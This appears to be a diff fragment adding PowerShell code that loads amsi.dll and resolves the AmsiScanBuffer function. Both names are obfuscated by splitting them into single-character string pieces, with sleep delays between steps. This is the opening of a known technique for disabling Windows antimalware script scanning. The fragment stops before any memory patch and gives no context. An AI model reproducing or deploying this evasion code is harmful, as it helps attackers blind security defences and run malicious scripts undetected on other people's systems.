@@ -1,0 +1,8 @@
+
+  
+  $LoadLibrary = [Win32]::LoadLibrary("a"+"m" + "s"+"i.d"+"l"+"l")
+  sleep 2
+  
+  $Address = [Win32]::GetProcAddress($LoadLibrary, "A"+"m"+"s"+"i" + "S"+"c"+"a"+"n" + "B"+"u"+"f"+"f"+"e"+"r")
+  $p = 0
+  sleep 2
